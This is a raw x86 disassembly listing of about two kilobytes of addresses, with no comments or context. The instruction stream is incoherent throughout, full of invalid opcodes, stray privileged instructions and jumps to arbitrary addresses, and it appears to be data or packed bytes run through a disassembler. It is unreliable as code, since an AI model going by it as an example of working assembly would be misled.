  4341d4:	mov    edi,DWORD PTR [ebx]
  4341d6:	jae    0x43422b
  4341d8:	pop    ecx
  4341d9:	add    BYTE PTR [eax],al
  4341db:	add    BYTE PTR [eax],al
  4341dd:	add    BYTE PTR [esi],bl
  4341df:	sahf   
  4341e0:	mov    edi,0x7b747504
  4341e5:	xor    BYTE PTR [ebp-0x27],0xfd
  4341e9:	add    al,0xfb
  4341eb:	pop    ebp
  4341ec:	std    
  4341ed:	push   DWORD PTR [ebp+0x2]
  4341f0:	pop    esp
  4341f1:	adc    DWORD PTR [edx-0x78],ecx
  4341f4:	scas   eax,DWORD PTR es:[edi]
  4341f5:	add    al,0x75
  4341f7:	add    bl,BYTE PTR [ecx+ecx*1-0x8]
  4341fb:	cmp    BYTE PTR [edi+0x39],dl
  4341fe:	das    
  4341ff:	outs   dx,BYTE PTR ds:[esi]
  434200:	cmp    eax,DWORD PTR [ecx]
  434202:	dec    BYTE PTR [ecx+0x52]
  434205:	mov    DWORD PTR [edi+0x5c043d54],eax
  43420b:	or     eax,0x298c807
  434210:	data16 sar BYTE PTR [ebp-0x7d],0x19
  434215:	dec    esp
  434216:	jge    0x4341d7
  434218:	jmp    0xe745b720
  43421d:	outs   dx,BYTE PTR ds:[esi]
  43421e:	jb     0x434295
  434220:	sub    DWORD PTR [eax],eax
  434222:	(bad)
  434225:	es jne 0x43422a
  434228:	sbb    DWORD PTR [edx+0x75],ebp
  43422b:	mov    edi,0x2754c21
  434230:	out    0x3,eax
  434232:	or     al,0xd
  434234:	pop    es
  434235:	enter  0x248,0x66
  434239:	shr    BYTE PTR [ebp+0x48],0x22
  43423d:	jge    0x434254
  43423f:	add    ah,bh
  434241:	add    eax,DWORD PTR [eax]
  434243:	add    BYTE PTR [eax],al
  434245:	add    BYTE PTR [eax],al
  434247:	jne    0x43424b
  434249:	out    0x3,eax
  43424b:	dec    esp
  43424c:	jnp    0x434274
  43424e:	pop    ecx
  43424f:	(bad)
  434254:	mov    ch,0x33
  434256:	enter  0xb5c1,0x2b
  43425a:	enter  0xb5b9,0xbc
  43425e:	mov    cl,dl
  434260:	cmp    bl,0x7
  434263:	mov    edx,0x4750e7e6
  434268:	dec    edi
  434269:	outs   dx,BYTE PTR ds:[esi]
  43426a:	repnz loop 0x434267
  43426d:	(bad)  
  43426e:	call   0x2cce44e9
  434273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434274:	jmp    0x43426f
  434276:	out    0x85,al
  434278:	mov    ds:0x60792c85,al
  43427d:	add    edi,DWORD PTR [eax]
  43427f:	cli    
  434280:	xchg   edx,eax
  434281:	hlt    
  434282:	iret   
  434283:	sub    eax,0x7e4dfa4e
  434289:	or     DWORD PTR [ecx],0x60
  43428c:	in     al,dx
  43428d:	stc    
  43428e:	sar    DWORD PTR [ebp-0x5a16ffe8],0xeb
  434295:	jge    0x434244
  434297:	jp     0x434316
  434299:	add    ebp,0x41
  43429c:	in     al,dx
  43429d:	stc    
  43429e:	rol    BYTE PTR [ecx],cl
  4342a0:	cld    
  4342a1:	sbb    DWORD PTR [edi+0x75],0x2
  4342a5:	add    BYTE PTR [ecx],bl
  4342a7:	cli    
  4342a8:	xor    esp,0x7f
  4342ae:	add    BYTE PTR [eax],al
  4342b0:	and    esp,ebp
  4342b2:	push   eax
  4342b3:	sbb    DWORD PTR [ebp-0x2b],0xd4ed6ef9
  4342ba:	test   DWORD PTR [ecx],esi
  4342bc:	cmc    
  4342bd:	mov    esi,0x7e30f208
  4342c2:	inc    ebx
  4342c3:	dec    ebp
  4342c4:	jns    0x434344
  4342c6:	xchg   edx,eax
  4342c7:	call   0x5cc84542
  4342cc:	xchg   edx,eax
  4342cd:	jmp    0x4342c8
  4342cf:	cmp    DWORD PTR ds:[eax+0x50],edx
  4342d3:	fwait
  4342d4:	sti    
  4342d5:	xor    esp,0x50ebe12f
  4342db:	cs xchg ebx,eax
  4342dd:	(bad)  
  4342de:	(bad)  
  4342df:	call   0xa62b455a
  4342e4:	cwde   
  4342e5:	add    al,BYTE PTR [eax]
  4342e7:	push   0xfffffffa
  4342e9:	push   cs
  4342ea:	add    DWORD PTR [eax],0x5c
  4342ed:	push   ebp
  4342ee:	sti    
  4342ef:	and    BYTE PTR [edi-0x12],0x83
  4342f3:	test   DWORD PTR [eax+0x39fff7ee],esi
  4342f9:	cmp    al,0xfc
  4342fb:	push   ecx
  4342fc:	or     DWORD PTR [ebx-0xe54010c],eax
  434302:	call   0xf834fc84
  434307:	adc    eax,0xfffffffa
  43430a:	jl     0x4342cc
  43430c:	mov    al,0xfd
  43430e:	jp     0x4342db
  434310:	sub    esp,DWORD PTR [ebp+0x7d]
  434313:	and    al,0x0
  434315:	add    BYTE PTR [eax],al
  434317:	add    BYTE PTR [eax],al
  434319:	sub    esi,ecx
  43431b:	test   DWORD PTR [ebp-0x72b51d7f],0xfff6eac9
  434325:	jmp    0x4342ec
  434327:	out    0xed,al
  434329:	jmp    0x43431b
  43432b:	jnp    0x4342f1
  43432d:	push   eax
  43432e:	jp     0x4342f0
  434330:	je     0x434351
  434332:	jl     0x4342f7
  434334:	call   FWORD PTR [ecx-0x68af0fc5]
  43433a:	jnp    0x434360
  43433c:	dec    DWORD PTR [ebx-0x4f727a0f]
  434342:	lock idiv edi
  434345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434346:	shr    esp,1
  434348:	jmp    FWORD PTR [ebx-0x6efb3b83]
  43434e:	mov    esi,0xa55f0374
  434353:	test   DWORD PTR [ebx-0x8e5af],0xf04583ab
  43435d:	std    
  43435e:	add    DWORD PTR [ebp-0x80e650c],0xf7e29ce8
  434368:	push   DWORD PTR [ebp+0x58]
  43436b:	enter  0xf004,0x1a
  43436f:	js     0x43436e
  434371:	imul   DWORD PTR [edi]
  434373:	in     eax,dx
  434374:	test   eax,esi
  434376:	mov    esi,0x5da2f9ee
  43437b:	push   edi
  43437c:	lock add BYTE PTR [eax],al
  43437f:	add    BYTE PTR [eax],al
  434381:	add    BYTE PTR [edi+0x46],al
  434384:	jg     0x43437a
  434386:	xchg   ebx,eax
  434387:	fucomi st,st(6)
  434389:	call   0xfa31fa02
  43438e:	not    BYTE PTR [esi+0x4eb58301]
  434394:	add    DWORD PTR [ebp+0x3e],edi
  434397:	mov    ebp,0xa614380
  43439c:	jns    0x434321
  43439e:	cdq    
  43439f:	lods   al,BYTE PTR ds:[esi]
  4343a0:	out    dx,al
  4343a1:	stc    
  4343a2:	call   0x533e34ed
  4343a7:	popf   
  4343a8:	aad    0xde
  4343aa:	pop    ecx
  4343ab:	test   esi,ebp
  4343ad:	jge    0x4343e8
  4343af:	(bad)  
  4343b0:	mov    al,al
  4343b2:	rcr    eax,0x82
  4343b5:	lds    esi,FWORD PTR [edx]
  4343b7:	jno    0x434341
  4343b9:	and    al,0x2a
  4343bb:	gs out dx,al
  4343bd:	mov    esi,eax
  4343bf:	mov    ebp,0xb1af9ee
  4343c4:	jg     0x434351
  4343c6:	or     DWORD PTR [esi+ebp*8-0x7],ebx
  4343ca:	sbb    eax,0x2f9e0aa
  4343cf:	pop    ecx
  4343d0:	rol    DWORD PTR [eax+esi*8],0x19
  4343d4:	jno    0x4343d3
  4343d6:	div    DWORD PTR [eax]
  4343d8:	out    dx,al
  4343d9:	test   eax,esi
  4343db:	std    
  4343dc:	in     al,dx
  4343dd:	stc    
  4343de:	loop   0x43443e
  4343e0:	pop    eax
  4343e1:	clc    
  4343e2:	inc    edi
  4343e3:	inc    esi
  4343e4:	xor    ah,0x0
  4343e7:	add    BYTE PTR [eax],al
  4343e9:	add    BYTE PTR [eax],al
  4343eb:	rol    DWORD PTR [edx],cl
  4343ed:	and    dh,dl
  4343ef:	fnsave [ecx]
  4343f1:	or     al,0xf2
  4343f3:	mov    esp,0xf6072b7f
  4343f8:	ret    0x693
  4343fb:	xor    BYTE PTR [edi-0x15c981fe],dh
  434401:	mov    esi,0xf2e35188
  434406:	icebp  
  434407:	es or  eax,0x2791405e
  43440d:	je     0x434443
  43440f:	mov    ebx,fs
  434411:	fidiv  DWORD PTR [edi+0x7b]
  434414:	sub    DWORD PTR [eax+edi*8+0x6],edx
  434418:	std    
  434419:	movq   mm4,QWORD PTR [ebp+0x6e]
  43441d:	in     al,dx
  43441e:	lods   al,BYTE PTR ds:[esi]
  43441f:	add    ah,bl
  434421:	mov    edx,0xb7cf8f1
  434426:	icebp  
  434427:	pop    esp
  434428:	jecxz  0x434486
  43442a:	xchg   edi,eax
  43442b:	(bad)  
  43442d:	mov    ds:0x6c75bbf1,al
  434432:	clc    
  434433:	aas    
  434434:	jecxz  0x4343c8
  434436:	fcom   QWORD PTR [ebx-0x2a]
  434439:	mov    dh,cl
  43443b:	mov    al,0xbe
  43443d:	jmp    0x4343c5
  43443f:	xor    eax,0x3884e66e
  434444:	jecxz  0x4344aa
  434446:	xchg   DWORD PTR [ecx-0x5a0e951d],ecx
  43444c:	ja     0x4344ba
  43444e:	sub    BYTE PTR [eax],al
  434450:	add    BYTE PTR [eax],al
  434452:	add    BYTE PTR [eax],al
  434454:	or     al,0xe3
  434456:	pop    edx
  434457:	jg     0x434447
  434459:	in     eax,dx
  43445a:	push   ecx
  43445b:	icebp  
  43445c:	cld    
  43445d:	fstp   DWORD PTR [edi]
  43445f:	loopne 0x43444d
  434461:	loop   0x4344c9
  434463:	enter  0x7d71,0x27
  434467:	js     0x434449
  434469:	jg     0x43446b
  43446b:	and    ah,ah
  43446d:	jp     0x43442a
  43446f:	cmc    
  434470:	(bad)
  434473:	adc    al,ah
  434475:	loop   0x434470
  434477:	jmp    0x1667bbbd
  43447c:	(bad)  
  43447d:	call   0xee4da0d1
  434482:	cli    
  434483:	push   es
  434484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434485:	xor    ebp,eax
  434487:	or     edx,eax
  434489:	call   0x7ce6a787
  43448e:	enter  0xbd6a,0xf9
  434492:	add    al,0xb7
  434494:	(bad)  
  434496:	in     al,0x54
  434498:	js     0x4344ff
  43449a:	(bad)
  43449d:	mov    fs,WORD PTR [esi+ecx*8]
  4344a0:	fcom   QWORD PTR gs:[ecx+0x1f]
  4344a4:	rcl    DWORD PTR [eax-0x75],0x64
  4344a8:	push   0xffffffdd
  4344aa:	stc    
  4344ab:	mov    dh,0xc6
  4344ad:	mov    DWORD PTR [ebx-0x73],edi
  4344b0:	cs jne 0x4344df
  4344b3:	jmp    0xf607a42e
  4344b8:	add    BYTE PTR [eax],al
  4344ba:	add    BYTE PTR [eax],al
  4344bc:	add    bl,bh
  4344be:	ret    0xea74
  4344c1:	icebp  
  4344c2:	(bad)  
  4344c3:	stc    
  4344c4:	(bad)  
  4344c5:	sti    
  4344c6:	es stc 
  4344c8:	xchg   BYTE PTR ds:0xc77d4b8e,ah
  4344ce:	lea    ecx,[ebx-0x623db83]
  4344d4:	cmp    DWORD PTR ds:0xf166f9e8,0x366404c6
  4344de:	push   edi
  4344df:	std    
  4344e0:	imul   edi,DWORD PTR [ecx-0x659b7a25],0x3300f9db
  4344ea:	pusha  
  4344eb:	dec    ebp
  4344ec:	lock (bad) 
  4344ee:	pusha  
  4344ef:	test   esp,esi
  4344f1:	mov    ds:0x14e8f7d2,al
  4344f6:	mov    edi,0xc95ffff7
  4344fb:	add    al,0x85
  4344fd:	mov    WORD PTR [ecx-0x5],ds
  434500:	adc    BYTE PTR [edi-0x77ba7a2e],0x35
  434507:	add    DWORD PTR [ebp-0x82d48],0x11
  43450e:	pusha  
  43450f:	hlt    
  434510:	(bad)  
  434511:	mov    ds:0x7729e8f1,eax
  434516:	shl    bh,cl
  434518:	sbb    eax,0xa
  43451b:	jge    0x4344dd
  43451d:	sub    BYTE PTR ds:0xcb7b,al
  434523:	add    BYTE PTR [eax],al
  434525:	add    BYTE PTR [ebx+0x43247d5d],ah
  43452b:	icebp  
  43452c:	test   DWORD PTR [ebp-0x72b62d5f],0xfff6dad1
  434536:	and    edi,DWORD PTR [esi-0xedc14fe]
  43453c:	jnp    0x434502
  43453e:	pop    eax
  43453f:	mov    al,al
  434541:	je     0x434592
  434543:	test   bl,al
  434545:	call   edi
  434547:	cmp    edi,esp
  434549:	lea    ebx,[ecx-0x2e]
  43454c:	push   eax
  43454d:	mov    ebx,DWORD PTR [ecx-0x5c0008d6]
  434553:	add    DWORD PTR [ebp-0x80e5d0c],0xffffff89
  43455a:	test   eax,0x93fff722
  43455f:	pop    edi
  434560:	mov    ch,0x30
  434562:	mov    ds:0x75e8f7f1,eax
  434567:	pop    ss
  434568:	(bad)  
  434569:	stc    
  43456a:	repnz imul ecx,eax,0x4
  43456e:	lock sub bh,BYTE PTR [eax-0x3]
  434572:	not    DWORD PTR [ebx]
  434574:	jmp    0x2d5a75fe
  434579:	(bad)  
  43457a:	mov    fs,WORD PTR [esi+0x20]
  43457d:	stc    
  43457e:	retf   0x7727
  434581:	push   cs
  434582:	jle    0x4345f2
  434584:	xor    al,0xf9
  434586:	mov    edx,0x676f7
  43458b:	add    BYTE PTR [eax],al
  43458d:	add    BYTE PTR [eax],al
  43458f:	ins    BYTE PTR es:[edi],dx
  434590:	mov    ?,ecx
  434592:	jae    0x434604
  434594:	ret    0xf070
  434597:	sub    esi,esp
  434599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43459a:	xchg   edi,eax
  43459b:	call   0xeac6:0xf885ead7
  4345a2:	stc    
  4345a3:	mov    dl,BYTE PTR [ebp+0x40]
  4345a6:	cld    
  4345a7:	and    al,0x6e
  4345a9:	xor    ah,0x7b
  4345ac:	mov    bh,0xea
  4345ae:	call   0xfa2e0a1f
  4345b3:	imul   BYTE PTR [ebp+0x16358301]
  4345b9:	std    
  4345ba:	jl     0x4345ea
  4345bc:	cdq    
  4345bd:	jbe    0x434612
  4345bf:	push   ecx
  4345c0:	aas    
  4345c1:	dec    eax
  4345c2:	cld    
  4345c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4345c4:	push   esp
  4345c5:	mov    BYTE PTR [edx+eax*2],ah
  4345c8:	sub    edx,0xeb7de88b
  4345ce:	stc    
  4345cf:	xor    ah,BYTE PTR [ebx-0x68]
  4345d2:	sub    cl,BYTE PTR fs:[ecx-0xe1f7816]
  4345d9:	call   0xb6c560d7
  4345de:	out    0x12,al
  4345e0:	jno    0x434660
  4345e2:	les    esi,FWORD PTR [ecx+0x2]
  4345e5:	ins    BYTE PTR es:[edi],dx
  4345e6:	ret    
  4345e7:	mov    DWORD PTR [ebx],eax
  4345e9:	mov    dx,0x8bfc
  4345ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4345ee:	out    dx,eax
  4345ef:	clc    
  4345f0:	test   DWORD PTR [ebx],eax
  4345f2:	out    dx,eax
  4345f3:	add    BYTE PTR [eax],al
  4345f5:	add    BYTE PTR [eax],al
  4345f7:	add    ah,ch
  4345f9:	fbstp  TBYTE PTR [eax+ebx*4-0x57]
  4345fd:	fistp  QWORD PTR [edx]
  4345ff:	out    dx,al
  434600:	repnz (bad) 
  434602:	ret    
  434603:	out    dx,al
  434604:	int3   
  434605:	fist   WORD PTR [ebp+0x21d6fe80]
  43460b:	out    dx,al
  43460c:	mov    esp,0xbc735c89
  434611:	fist   WORD PTR [edx]
  434613:	fld    TBYTE PTR [ebx-0x14]
  434616:	or     ch,dh
  434618:	sub    dh,al
  43461a:	jmp    0x4345a4
  43461c:	mov    ch,0x56
  43461e:	out    0x82,al
  434620:	mov    al,0xdf
  434622:	pop    esi
  434623:	cwde   
  434624:	and    edi,ebx
  434626:	jmp    0x7ced:0x4b9df0ed
  43462d:	fild   QWORD PTR [esi-0x79]
  434630:	add    eax,0xf8edd2df
  434635:	retf   
  434636:	out    0xbc,al
  434638:	js     0x4345bf
  43463a:	dec    edi
  43463b:	in     eax,dx
  43463c:	pop    esp
  43463d:	(bad)  
  43463f:	repz retf 
  434641:	divps  xmm0,XMMWORD PTR [edi+0x59]
  434645:	push   edi
  434646:	jecxz  0x434670
  434648:	or     dl,BYTE PTR [ecx+ebp*8+0x30]
  43464c:	cmp    bl,BYTE PTR [ebx]
  43464e:	sar    BYTE PTR [eax-0x6b],0x8b
  434652:	ins    BYTE PTR es:[edi],dx
  434653:	sub    BYTE PTR [edi+ebx*8],ch
  434656:	mov    bh,BYTE PTR [ecx-0x2]
  434659:	icebp  
  43465a:	sub    ebp,0x0
  434660:	add    BYTE PTR [edx+esi*1],bl
  434663:	sbb    ch,ch
  434665:	push   es
  434666:	or     al,BYTE PTR [eax]
  434668:	jbe    0x43468a
  43466a:	fnstcw WORD PTR [ebp-0x5b]
  43466d:	or     DWORD PTR [edx],edi
  43466f:	pop    edx
  434670:	sbb    bh,BYTE PTR [ecx]
  434672:	xor    eax,0x9daa4485
  434677:	test   DWORD PTR [ecx],esi
  434679:	mov    WORD PTR [eax+0x737c3785],?
  43467f:	jo     0x4346c7
  434681:	rcr    al,1
  434683:	and    eax,0x68736c1e
  434688:	ss loopne 0x434663
  43468b:	push   0x27139
  434690:	xchg   ebx,eax
  434691:	ja     0x4346e2
  434693:	xchg   DWORD PTR [ebp+eax*4-0x27],edi
  434697:	stc    
  434698:	push   ss
  434699:	cs jae 0x4346dc
  43469c:	push   cs
  43469d:	cwde   
  43469e:	fadd   DWORD PTR [edi-0x626ba94]
  4346a4:	(bad)  
  4346a5:	pop    ds
  4346a6:	xchg   ebx,eax
  4346a7:	pusha  
  4346a8:	mul    BYTE PTR [ecx-0x5d637828]
  4346ae:	xchg   BYTE PTR [ebx-0x3f],cl
  4346b1:	xchg   ecx,eax
  4346b2:	repnz sbb ebp,DWORD PTR [ebp-0x4e7afdcb]
  4346b9:	cmc    
  4346ba:	(bad)  
  4346bb:	or     al,0x64
  4346bd:	cmp    eax,0x92801357
  4346c2:	add    al,BYTE PTR [eax]
  4346c4:	jmp    0x4346c9
  4346c9:	add    bl,bl
  4346cb:	xchg   ecx,eax
  4346cc:	hlt    
  4346cd:	mov    bh,0x61
  4346cf:	fadd   QWORD PTR [ebp-0x5c105a4e]
  4346d5:	xchg   ecx,eax
  4346d6:	test   ecx,edx
  4346d8:	stc    
  4346d9:	sahf   
  4346da:	test   eax,0xbdaa8538
  4346df:	xchg   ebx,esp
  4346e1:	sub    al,0x34
  4346e3:	iret   
  4346e4:	int3   
  4346e5:	add    al,ch
  4346e7:	popf   
  4346e8:	int3   
  4346e9:	int3   
  4346ea:	enter  0xcc9d,0xcc
  4346ee:	jno    0x43474b
  4346f0:	in     al,dx
  4346f1:	or     DWORD PTR [eax+0x218b4dfd],0xffffffde
  4346f8:	sub    al,0xc0
  4346fa:	push   edi
  4346fb:	(bad)  
  4346fc:	je     0x43472b
  4346fe:	xor    ebp,DWORD PTR [ecx+0x1dc0008]
  434704:	test   DWORD PTR [ebp-0x80],edi
  434707:	rcr    BYTE PTR [ebp-0x7e15ee77],cl
  43470d:	inc    ebp
  43470e:	mov    BYTE PTR [edx+0x3d],bl
  434711:	or     ah,ch
  434713:	test   eax,0x1ccfff9
  434718:	test   DWORD PTR [ebp-0x80],edx
  43471b:	mov    ecx,0xee8bfb76
  434720:	jnp    0x4346e6
  434722:	nop
  434723:	dec    esi
  434724:	push   esi
  434725:	mov    esi,DWORD PTR [ecx+0x4c]
  434728:	mov    edx,0x455a8c08
  43472d:	or     BYTE PTR [eax],al
  43472f:	add    BYTE PTR [eax],al
  434731:	add    BYTE PTR [eax],al
  434733:	in     eax,dx
  434734:	test   eax,0x19cfff9
  434739:	sub    edx,edx
  43473b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43473c:	repz call FWORD PTR gs:[ebx-0x55fb3b7b]
  434744:	pop    ebp
  434745:	fstp   QWORD PTR [ebp+0x1e]
  434748:	fdivp  st(1),st
  43474a:	retf   
  43474b:	sub    BYTE PTR [edx-0x65f73334],bl
  434751:	int3   
  434752:	int3   
  434753:	jno    0x4347b2
  434755:	in     al,dx
  434756:	push   esi
  434757:	xlat   BYTE PTR ds:[ebx]
  434758:	push   ebx
  434759:	or     BYTE PTR [ebp-0x72f7ad1e],al
  43475f:	xchg   edx,eax
  434760:	mov    WORD PTR [esi+0x5d],ss
  434763:	jne    0x43470e
  434765:	add    BYTE PTR [eax],al
  434767:	test   BYTE PTR [esp+eiz*8+0x0],0x75
  43476c:	jmp    0x43476b
  43476e:	jae    0x4347e3
  434770:	cmc    
  434771:	fisttp DWORD PTR [edx-0x7a1aabf1]
  434777:	mov    bl,0x9b
  434779:	jp     0x4347c5
  43477b:	popa   
  43477c:	push   eax
  43477d:	dec    esi
  43477e:	adc    al,0xa5
  434780:	call   0xf8fd:0xc14bcee6
  434787:	or     BYTE PTR [ebx],0xb8
  43478a:	cmp    eax,0x10c06875
  43478f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434790:	sub    eax,DWORD PTR [esi+0x5b]
  434793:	mov    bh,0xee
  434795:	std    
  434796:	retf   
  434797:	add    BYTE PTR [eax],al
  434799:	add    BYTE PTR [eax],al
  43479b:	add    BYTE PTR [ecx-0x4e334802],bh
  4347a1:	push   ss
  4347a2:	mov    eax,0xb82ea9cc
  4347a7:	int3   
  4347a8:	rcr    DWORD PTR [ebp-0x21091386],0xf1
  4347af:	push   eax
  4347b0:	data16 add al,0x2b
  4347b3:	jnp    0x434832
  4347b5:	push   edi
  4347b6:	sti    
  4347b7:	mov    bh,BYTE PTR [edx]
  4347b9:	xor    DWORD PTR [ebp-0x7b],eax
  4347bc:	nop
  4347bd:	(bad)  
  4347be:	ret    
  4347bf:	adc    al,0x75
  4347c1:	sbb    eax,0x206d7379
  4347c6:	in     eax,dx
  4347c7:	je     0x434846
  4347c9:	pusha  
  4347ca:	aas    
  4347cb:	pusha  
  4347cc:	jle    0x4347f1
  4347ce:	pusha  
  4347cf:	jae    0x434841
  4347d1:	and    ebp,DWORD PTR [esi+edx*4+0x59e69d5a]
  4347d8:	dec    dh
  4347da:	dec    eax
  4347db:	mov    esi,0xba2ce961
  4347e0:	push   ebp
  4347e1:	add    esp,edi
  4347e3:	add    esi,DWORD PTR [ebp+0x56]
  4347e6:	loope  0x434839
  4347e8:	sbb    eax,0x2cea8cfe
  4347ed:	mov    ds,WORD PTR [esp+ecx*1]
  4347f0:	mov    dl,0x8d
  4347f2:	sbb    al,0xf0
  4347f4:	stos   DWORD PTR es:[edi],eax
  4347f5:	lea    esp,[eax+ebp*8]
  4347f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4347f9:	jmp    0xbf66:0xdc0cf123
  434800:	add    BYTE PTR [eax],al
  434802:	add    BYTE PTR [eax],al
  434804:	add    BYTE PTR [ecx-0x7b],dh
  434807:	daa    
  434808:	outs   dx,DWORD PTR ds:[esi]
  434809:	outs   dx,BYTE PTR ds:[esi]
  43480a:	cmp    al,0x9f
  43480c:	mov    esp,gs
  43480e:	fist   DWORD PTR [edx+0x4a]
  434811:	lock in eax,0xac
  434814:	lds    ecx,FWORD PTR [ecx-0x3aa469fe]
  43481a:	add    ah,bh
  43481c:	add    ebx,DWORD PTR [ebx+0x1]
  43481f:	call   0x7546:0x1afe66ea
  434826:	xchg   DWORD PTR [edi],edi
  434828:	xchg   BYTE PTR [ecx+0x29cade0e],dh
  43482e:	aas    
  43482f:	jg     0x434834
  434831:	xor    eax,0xa25de702
  434836:	xor    al,0x2
  434838:	adc    BYTE PTR [ecx-0x32],bh
  43483b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43483c:	add    edi,eax
  43483e:	dec    ebp
  43483f:	sti    
  434840:	jge    0x434868
  434842:	fisub  DWORD PTR [eax+0x3e]
  434845:	and    eax,0xf20c3487
  43484a:	das    
  43484b:	xor    edi,DWORD PTR [ebp-0x3a]
  43484e:	mul    BYTE PTR [ebp-0x40]
  434851:	jns    0x4347dc
  434853:	out    0x7a,al
  434855:	mov    eax,0xd56d703a
  43485a:	mov    DWORD PTR [esi],edi
  43485c:	pusha  
  43485d:	cli    
  43485e:	outs   dx,BYTE PTR ds:[esi]
  43485f:	add    BYTE PTR [ecx-0xdfffd8f],ah
  434865:	xor    eax,0x3a174f
  43486a:	add    BYTE PTR [eax],al
  43486c:	add    BYTE PTR [eax],al
  43486e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43486f:	fst    DWORD PTR [ebx]
  434871:	leave  
  434872:	jmp    0x550a:0x356a001c
  434879:	das    
  43487a:	sar    DWORD PTR [ecx-0x7],1
  43487d:	xchg   BYTE PTR [ecx+edi*1],cl
  434880:	test   DWORD PTR [edx+edi*4-0x7616eb64],eax
  434887:	aas    
  434888:	or     al,0x60
  43488a:	nop
  43488b:	dec    edx
  43488c:	xor    eax,0x850a852e
  434891:	outs   dx,DWORD PTR ds:[esi]
  434892:	ins    DWORD PTR es:[edi],dx
  434893:	add    al,BYTE PTR [eax]
  434895:	jmp    0x9cc85309
  43489a:	xchg   BYTE PTR ds:0xc18abdc9,dl
  4348a0:	jmp    esi
  4348a2:	jbe    0x4348a6
  4348a4:	add    BYTE PTR [edx-0x9],ah
  4348a7:	mov    DWORD PTR [eax],eax
  4348a9:	jmp    0xf023a624
  4348ae:	icebp  
  4348af:	jmp    0x5dc3ddb2
  4348b4:	call   0x7d4a63a4
  4348b9:	add    DWORD PTR [ebx+0x4f],edi
  4348bc:	adc    ch,BYTE PTR [esi]
  4348be:	jbe    0x43489b
  4348c0:	stc    
  4348c1:	jmp    0x2e4e2e3c
  4348c6:	jbe    0x4348a4
  4348c8:	stc    
  4348c9:	jmp    0xae462e44
  4348ce:	ja     0x4348d3
  4348d0:	add    cl,ch
  4348d2:	add    BYTE PTR [eax],al
  4348d4:	add    BYTE PTR [eax],al
  4348d6:	add    BYTE PTR [esi+0x7f],dh
  4348d9:	cmp    BYTE PTR [ebp+0x76],0x2
  4348dd:	add    BYTE PTR [eax-0x2f],ah
  4348e0:	push   edx
  4348e1:	xchg   DWORD PTR [eax],eax
  4348e3:	mov    bh,0x36
  4348e5:	cmp    DWORD PTR [ebx-0x40],0xd7743b5d
  4348ec:	pop    ebx
  4348ed:	mov    WORD PTR [eax],es
  4348ef:	dec    esp
  4348f0:	push   es
  4348f1:	or     DWORD PTR [ebx+0x5d4],0x893043a7
  4348fb:	lahf   
  4348fc:	test   eax,0x570c0000
  434901:	mov    esi,0x5db78d
  434906:	add    BYTE PTR [ebp*4+0x61c0003],bl
  43490d:	jmp    0x4348b4
  43490f:	xchg   edi,eax
  434910:	sbb    eax,0xc5878948
  434915:	add    BYTE PTR [eax],al
  434917:	fcom   QWORD PTR [esi+0x48]
  43491a:	dec    esp
  43491b:	(bad)  
  43491c:	jmp    0x43489f
  43491e:	mov    ebx,DWORD PTR [eax+0x65000005]
  434924:	data16 sbb BYTE PTR [ebx+0x5144],cl
  43492b:	fdivr  QWORD PTR [esi-0xf]
  43492e:	or     al,0x9
  434930:	cmp    al,0x33
  434932:	xlat   BYTE PTR ds:[ebx]
  434933:	fnstenv [edi]
  434935:	mov    edi,0x56483
  43493a:	add    BYTE PTR [eax],al
  43493c:	add    BYTE PTR [eax],al
  43493e:	add    BYTE PTR [eax],al
  434940:	popf   
  434941:	add    eax,0x5d170000
  434946:	cwde   
  434947:	add    BYTE PTR [ebp+eax*1+0x56f44b81],cl
  43494e:	nop
  43494f:	pushf  
  434950:	pushf  
  434951:	add    eax,0x61df8900
  434956:	or     DWORD PTR [eax-0x114],0xffffffe5
  43495d:	pop    ebp
  43495e:	add    BYTE PTR [eax],0x75
  434961:	jmp    0x434960
  434963:	test   BYTE PTR ds:0x7500047f,al
  434969:	push   esp
  43496a:	aaa    
  43496b:	cld    
  43496c:	cld    
  43496d:	cmp    eax,DWORD PTR [eax+0x2eeb7500]
  434973:	into   
  434974:	jbe    0x4349d9
  434976:	int3   
  434977:	add    BYTE PTR [ebp-0x15],dh
  43497a:	push   cs
  43497b:	nop
  43497c:	push   ecx
  43497d:	jmp    0x43497c
  43497f:	push   esi
  434981:	test   eax,0x624a0d02
  434986:	gs or  ah,ch
  434989:	adc    eax,DWORD PTR [edi+eax*4-0x5a]
  43498d:	pop    ds
  43498e:	jnp    0x434928
  434990:	adc    eax,0x9efffdeb
  434995:	bound  ebp,QWORD PTR [esp+eiz*8+0x59fdeb75]
  43499c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43499d:	sub    eax,DWORD PTR [ecx-0x7b]
  4349a0:	ror    BYTE PTR [ebp+0x14bf],1
  4349a6:	add    BYTE PTR [eax],al
  4349a8:	add    BYTE PTR [ebp+0x6c],dh
  4349ab:	jmp    0x4349b5
  4349ad:	pusha  
  4349ae:	fs and eax,0x753048d1
  4349b4:	adc    ebp,DWORD PTR [ecx+0x1f]
  4349b7:	cmp    eax,0x7cd34f00
  4349bc:	dec    ebp
  4349bd:	xchg   ecx,eax
  4349be:	dec    edx
  4349bf:	and    al,0xcc
  4349c1:	ss jmp 0x434a19
  4349c4:	sub    DWORD PTR [ebx],esp
  4349c6:	stos   DWORD PTR es:[edi],eax
  4349c7:	std    
  4349c8:	xchg   BYTE PTR [esi],dh
  4349ca:	ret    
  4349cb:	js     0x434a0a
  4349cd:	jno    0x434a44
  4349cf:	hlt    
  4349d0:	push   eax
  4349d1:	cld    
  4349d2:	adc    DWORD PTR [ecx],0xffffff87
  4349d5:	dec    ebp
  4349d6:	bound  esp,QWORD PTR [ebp+0x8]
  4349d9:	lea    eax,[edx]
  4349db:	adc    al,0x0
  4349dd:	jne    0x4349e1
  4349df:	outs   dx,BYTE PTR ds:[esi]
  4349e0:	repz test al,0xcf
  4349e3:	push   esp
  4349e4:	div    ecx
  4349e6:	cmp    eax,0x4aa0bedf
  4349eb:	fild   WORD PTR [ebx]
